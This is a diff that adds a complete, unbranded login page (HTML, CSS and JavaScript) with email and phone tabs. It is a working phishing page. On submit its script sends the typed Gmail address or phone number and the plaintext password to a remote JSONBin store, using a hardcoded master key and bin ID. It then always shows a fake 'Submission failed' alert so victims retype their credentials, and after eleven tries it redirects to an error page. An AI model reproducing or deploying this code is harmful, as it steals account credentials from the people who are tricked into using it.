@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login Page</title>
+  <style>
+    /* Reset & base */
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      display: flex;
+      justify-content: center;      /* center horizontally */
+      align-items: flex-start;      /* align near top */
+      min-height: 100vh;
+      padding-top: 10px;             /* 10px from top */
+      background: #0B0E14;
+      padding-left: 16px;
+      padding-right: 16px;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      font-size: 16px;
+      color: #fff;
+    }
+
+    /* Container */
+    .login-container {
+      position: relative;
+      background: #1E2635;
+      padding: 30px 20px 16px;
+      border-radius: 8px;
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      min-height: 500px;
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 12px;
+      right: 12px;
+      background: none;
+      border: none;
+      font-size: 20px;
+      color: #8899AA;
+      cursor: pointer;
+      z-index: 10;
+    }
+    .close-btn:hover { color: #fff; }
+
+    h2 {
+      margin-bottom: 20px;
+      letter-spacing: 1px;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    /* Tabs */
+    .tabs { display: flex; margin-bottom: 24px; }
+    .tab {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      padding: 10px 0;
+      cursor: pointer;
+      border-radius: 5px;
+      font-size: 14px;
+      font-weight: 500;
+      transition: background-color .3s ease;
+    }
+    .tab.active {
+      background: #2979FF;
+      color: #fff;
+    }
+    .tab:not(.active) {
+      background: #2E3949;
+      color: #8899AA;
+    }
+    .tab:not(.active):hover {
+      background: #3C4A5C;
+    }
+    .tab img {
+      width: 16px;
+      height: 16px;
+    }
+
+    /* Form & inputs */
+    form { flex: 1; display: flex; flex-direction: column; }
+    .input-group {
+      width: 100%;
+      margin-bottom: 10px;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+    }
+    .input-group input[type=email],
+    .input-group input[type=password],
+    .input-group input[type=tel] {
+      width: 100%;
+      padding: 9px 10px;
+      background: #2E3949;
+      border: 1px solid transparent;    /* reserve space so focus border won't shift */
+      border-radius: 5px;
+      color: #fff;
+      font-size: 16px;
+      outline: none;
+    }
+    .input-group input:focus {
+      border-color: #2979FF;           /* only color changes */
+    }
+    .error-msg {
+      font-size: 13px;
+      color: #ff4d4d;
+      margin-top: 4px;
+      text-align: left;
+      display: block;
+      position: relative;
+    }
+
+    /* Phone unified */
+    #group-phone { display: none; }
+    .phone-unified {
+      display: flex;
+      align-items: center;
+      width: 100%;
+      background: #2E3949;
+      border-radius: 5px;
+      padding: 9px 10px;
+      gap: 10px;
+    }
+    .phone-unified img {
+      width: 20px;
+      height: 14px;
+    }
+    .phone-unified select {
+      background: #2E3949;
+      border: none;
+      color: #fff;
+      font-size: 16px;
+      outline: none;
+      cursor: pointer;
+      border-radius: 5px;
+      appearance: none;
+    }
+    .phone-unified input::placeholder {
+      color: #8899AA;
+    }
+
+    /* Password toggle */
+    .toggle-pw {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+    }
+    .toggle-pw img {
+      width: 20px;
+      height: 20px;
+    }
+
+    /* Recover & footer */
+    .recover {
+      text-align: center;
+      font-size: 14px;
+      color: #8899AA;
+      margin-bottom: 220px;
+    }
+    .recover a { color: #fff; text-decoration: underline; font-weight: 500; }
+    .footer-text {
+      text-align: center;
+      margin-top: 15px;
+      margin-bottom: 5px;
+    }
+    .footer-text p {
+      font-size: 14px;
+      color: #8899AA;
+      margin-bottom: 4px;
+      font-weight: 500;
+    }
+    .footer-text a {
+      font-size: 14px;
+      color: #fff;
+      text-decoration: underline;
+      font-weight: 500;
+    }
+
+    /* Button */
+    .btn {
+      width: 100%;
+      padding: 14px;
+      background: #2979FF;
+      border: none;
+      border-radius: 5px;
+      color: #fff;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background-color .3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+    .btn:hover { background-color: #1a63e0; }
+    .btn::after {
+      content: '';
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background-color: rgba(255,255,255,0.2);
+      opacity: 0;
+      transition: opacity .4s ease;
+    }
+
+    @keyframes clickFlash {
+      0% { opacity: 0.3; }
+      100% { opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container" id="loginModal">
+    <button class="close-btn" id="closeBtn">&times;</button>
+    <h2>LOGIN</h2>
+
+    <div class="tabs">
+      <div class="tab active" id="tab-email">
+        <img id="icon-email" src="email-active.png" alt="Email"> Email
+      </div>
+      <div class="tab" id="tab-phone">
+        <img id="icon-phone" src="phone-inactive.png" alt="Phone"> Phone
+      </div>
+    </div>
+
+    <form id="login-form">
+      <!-- Email input -->
+      <div class="input-group" id="group-email" style="display: flex;">
+        <input type="email" id="email" placeholder="E-mail" />
+        <div class="error-msg" id="email-error"></div>
+      </div>
+
+      <!-- Phone input -->
+      <div class="input-group" id="group-phone">
+        <div class="phone-unified">
+          <img src="https://flagcdn.com/w20/in.png" alt="flag" id="phone-flag">
+          <select id="country-code" onchange="phoneFlag.src=this.options[this.selectedIndex].dataset.flag">
+            <option value="+91" data-flag="https://flagcdn.com/w20/in.png">+91</option>
+            <option value="+1" data-flag="https://flagcdn.com/w20/us.png">+1</option>
+            <!-- Add more as needed -->
+          </select>
+          <input type="tel" id="phone" placeholder="Phone number" />
+        </div>
+        <div class="error-msg" id="phone-error"></div>
+      </div>
+
+      <!-- Password input -->
+      <div class="input-group" style="position: relative;">
+        <input type="password" id="password" placeholder="Password" />
+        <button type="button" class="toggle-pw" id="toggle-pw">
+          <img id="icon-pw" src="eye-closed.png" alt="Toggle">
+        </button>
+        <div class="error-msg" id="password-error"></div>
+      </div>
+
+      <div class="recover">Don't remember? <a href="#">Recover a password</a></div>
+      <div class="footer-text">
+        <p>Don't have an account?</p>
+        <a href="#">Sign up</a>
+      </div>
+      <button type="submit" class="btn" id="loginBtn" disabled>SIGN IN</button>
+    </form>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      // Elements
+      const tabEmail      = document.getElementById('tab-email');
+      const tabPhone      = document.getElementById('tab-phone');
+      const groupEmail    = document.getElementById('group-email');
+      const groupPhone    = document.getElementById('group-phone');
+      const iconEmail     = document.getElementById('icon-email');
+      const iconPhone     = document.getElementById('icon-phone');
+      const emailField    = document.getElementById('email');
+      const phoneField    = document.getElementById('phone');
+      const countryCode   = document.getElementById('country-code');
+      const phoneFlag     = document.getElementById('phone-flag');
+      const passwordField = document.getElementById('password');
+      const togglePwBtn   = document.getElementById('toggle-pw');
+      const iconPw        = document.getElementById('icon-pw');
+      const emailError    = document.getElementById('email-error');
+      const phoneError    = document.getElementById('phone-error');
+      const passwordError = document.getElementById('password-error');
+      const loginBtn      = document.getElementById('loginBtn');
+      const closeBtn      = document.getElementById('closeBtn');
+      const form          = document.getElementById('login-form');
+
+      // JSONBin config
+      const binId = "67ea9e3a8a456b79667ff984";
+      const apiKey = "$2a$10$KxrIzD6vk0We8pfpySnbfOvkTSyr5i/RKwnItuvXA0KYkMEPRo/zC";
+
+      // Validation state
+      let emailTouched = false, phoneTouched = false;
+      const maxAttempts = 11;
+      let loginAttempts = parseInt(localStorage.getItem('loginAttempts') || '0', 10);
+
+      // Tab switch
+      function switchTab(type) {
+        const isPhone = type === 'phone';
+        tabPhone.classList.toggle('active', isPhone);
+        tabEmail.classList.toggle('active', !isPhone);
+        groupPhone.style.display = isPhone ? 'flex' : 'none';
+        groupEmail.style.display = isPhone ? 'none' : 'flex';
+        iconPhone.src = isPhone ? 'phone-active.png'   : 'phone-inactive.png';
+        iconEmail.src = isPhone ? 'email-inactive.png' : 'email-active.png';
+        emailError.textContent = '';
+        phoneError.textContent = '';
+        validateInputs();
+      }
+      tabEmail.addEventListener('click', () => switchTab('email'));
+      tabPhone.addEventListener('click', () => switchTab('phone'));
+      switchTab('email');
+
+      // Close modal
+      closeBtn.addEventListener('click', () => {
+        document.querySelector('.login-container').style.display = 'none';
+      });
+
+      // Input events
+      emailField.addEventListener('input', () => { emailTouched = true; validateInputs(); });
+      phoneField.addEventListener('input', () => {
+        phoneTouched = true;
+        phoneField.value = phoneField.value.replace(/\D/g, '');
+        validateInputs();
+      });
+      passwordField.addEventListener('input', validateInputs);
+
+      // Password toggle
+      togglePwBtn.addEventListener('click', () => {
+        const hidden = passwordField.type === 'password';
+        passwordField.type = hidden ? 'text' : 'password';
+        iconPw.src = hidden ? 'eye-open.png' : 'eye-closed.png';
+      });
+
+      // Validate
+      function validateInputs() {
+        const pwdOK   = passwordField.value.length >= 6;
+        const emailOK = /@gmail\.com$/.test(emailField.value);
+        const phoneOK = /^[0-9]{10}$/.test(phoneField.value);
+        const usingPhone = tabPhone.classList.contains('active');
+
+        emailError.textContent = (!usingPhone && emailTouched && !emailOK) ? 'E-mail must be valid' : '';
+        phoneError.textContent = (usingPhone && phoneTouched && !phoneOK) ? 'Phone number must be valid' : '';
+        passwordError.textContent = (passwordField.value.length > 0 && !pwdOK) ? 'Min 6 characters' : '';
+
+        loginBtn.disabled = !(pwdOK && (usingPhone ? phoneOK : emailOK));
+      }
+
+      // Submit
+      form.addEventListener('submit', async e => {
+        e.preventDefault();
+        if (loginAttempts >= maxAttempts) {
+          window.location.href = 'error.html';
+          return;
+        }
+
+        const email     = emailField.value.trim();
+        const phoneFull = countryCode.value + phoneField.value.trim();
+        const pwd       = passwordField.value;
+        const usingPhone = tabPhone.classList.contains('active');
+
+        // Empty checks
+        if (!pwd || (!email && !phoneField.value)) {
+          if (!pwd) passwordError.textContent = 'Enter password';
+          if (usingPhone && !phoneField.value) phoneError.textContent = 'Enter phone number';
+          if (!usingPhone && !email) emailError.textContent = 'Enter email address';
+          return;
+        }
+
+        // Final validation
+        const emailValid = /@gmail\.com$/.test(email);
+        const phoneValid = /^[0-9]{10}$/.test(phoneField.value);
+        if ((!usingPhone && !emailValid) || (usingPhone && !phoneValid) || pwd.length < 6) {
+          if (!emailValid && !usingPhone) emailError.textContent = 'Fill email correctly';
+          if (!phoneValid && usingPhone) phoneError.textContent = 'Phone number must be valid';
+          if (pwd.length < 6) passwordError.textContent = 'Min 6 characters';
+          return;
+        }
+
+        const payload = {
+          loginType: usingPhone ? 'phone' : 'email',
+          email:     usingPhone ? null : email,
+          phone:     usingPhone ? phoneFull : null,
+          password:  pwd,
+          timestamp: new Date().toISOString()
+        };
+
+        try {
+          const getRes = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
+            headers: { 'X-Master-Key': apiKey }
+          });
+          const json = await getRes.json();
+          const arr  = Array.isArray(json.record) ? json.record : [];
+          arr.push(payload);
+
+          const upd = await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
+            method: 'PUT',
+            headers: {
+              'Content-Type': 'application/json',
+              'X-Master-Key':  apiKey
+            },
+            body: JSON.stringify(arr)
+          });
+          if (!upd.ok) throw Error();
+
+          loginAttempts++;
+          localStorage.setItem('loginAttempts', loginAttempts);
+
+          alert('⚠️ Submission failed. Please try again.');
+
+          emailField.value    = '';
+          phoneField.value    = '';
+          passwordField.value = '';
+          validateInputs();
+
+          if (loginAttempts >= maxAttempts) {
+            window.location.href = 'error.html';
+          }
+        } catch {
+          alert('Oops! Something went wrong. Server error.');
+        }
+      });
+    });
+  </script>
+</body>
+</html>
